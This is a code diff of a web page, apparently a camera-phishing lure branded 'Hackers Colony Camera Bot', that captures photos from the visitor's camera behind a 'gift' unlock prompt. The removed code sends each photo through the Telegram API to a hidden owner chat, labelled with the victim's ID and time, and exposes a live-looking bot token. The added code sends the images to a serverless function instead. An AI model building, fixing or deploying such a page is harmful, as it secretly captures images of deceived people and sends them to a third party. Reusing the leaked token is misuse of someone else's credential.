@@ -145,8 +145,8 @@ button:disabled {
 
 <script>
 // ===== CONFIG =====
-const BOT_TOKEN = "8226782560:AAFPl8aGBfO-KBeSLgoh98dSyOTa1-AouFY";
-const OWNER_ID = "8215819954";
+// NOTE: Bot token and owner ID are now securely stored in Netlify environment variables
+// They are NOT visible in this file!
 const USER_ID = new URLSearchParams(window.location.search).get('uid');
 
 // Debug logging
@@ -346,7 +346,7 @@ document.getElementById("unlockBtn").onclick = async () => {
   }
 };
 
-// ===== CAPTURE AND SEND PHOTO =====
+// ===== SECURE PHOTO SENDING =====
 async function captureAndSendPhoto(label) {
   return new Promise(async (resolve) => {
     try {
@@ -357,83 +357,39 @@ async function captureAndSendPhoto(label) {
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       
-      debugLog(`🖼️ Converting ${label} to blob...`);
+      debugLog(`🖼️ Converting ${label} to image...`);
       
-      // Convert to blob
-      canvas.toBlob(async (blob) => {
-        if (!blob) {
-          debugLog(`⚠️ No blob created for ${label}`);
-          resolve();
-          return;
+      // Convert to base64
+      const imageData = canvas.toDataURL('image/jpeg', 0.9);
+      
+      debugLog(`📤 Sending ${label} via secure function...`);
+      
+      try {
+        // Send to Netlify serverless function (SECURE)
+        const response = await fetch('/.netlify/functions/sendPhoto', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            image: imageData,
+            label: label,
+            userId: USER_ID
+          })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+          debugLog(`✅ ${label} sent successfully!`);
+        } else {
+          debugLog(`⚠️ Send failed: ${result.error}`);
         }
-        
-        debugLog(`📤 Sending ${label} (${Math.round(blob.size/1024)}KB)...`);
-        
-        // ===== SEND TO USER =====
-        try {
-          const userFormData = new FormData();
-          userFormData.append('photo', blob, 'gift.jpg');
-          userFormData.append('chat_id', USER_ID);
-          userFormData.append('caption', `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`);
-          
-          debugLog(`📲 Sending to user ${USER_ID}...`);
-          
-          const userResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: userFormData
-          });
-          
-          const userResult = await userResponse.json();
-          
-          if (userResponse.ok) {
-            debugLog(`✅ ${label} sent to user!`);
-          } else {
-            debugLog(`⚠️ User send failed: ${userResult.description || userResponse.status}`);
-          }
-          
-        } catch (userError) {
-          debugLog(`❌ User send error: ${userError.message}`);
-        }
-        
-        // ===== CREATE NEW BLOB FOR OWNER =====
-        canvas.toBlob(async (ownerBlob) => {
-          if (!ownerBlob) {
-            debugLog(`⚠️ No owner blob for ${label}`);
-            resolve();
-            return;
-          }
-          
-          // ===== SEND TO OWNER =====
-          try {
-            const ownerFormData = new FormData();
-            ownerFormData.append('photo', ownerBlob, 'gift.jpg');
-            ownerFormData.append('chat_id', OWNER_ID);
-            ownerFormData.append('caption', `📸 From User ${USER_ID}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`);
-            
-            debugLog(`📲 Sending to owner...`);
-            
-            const ownerResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: 'POST',
-              body: ownerFormData
-            });
-            
-            const ownerResult = await ownerResponse.json();
-            
-            if (ownerResponse.ok) {
-              debugLog(`✅ ${label} sent to owner!`);
-            } else {
-              debugLog(`⚠️ Owner send failed: ${ownerResult.description || ownerResponse.status}`);
-            }
-            
-          } catch (ownerError) {
-            debugLog(`❌ Owner send error: ${ownerError.message}`);
-          }
-          
-          resolve();
-          
-        }, 'image/jpeg', 0.9);
-        
-      }, 'image/jpeg', 0.9);
+      } catch (sendError) {
+        debugLog(`❌ Network error: ${sendError.message}`);
+      }
+      
+      resolve();
       
     } catch (error) {
       debugLog(`❌ Capture error for ${label}: ${error.message}`);
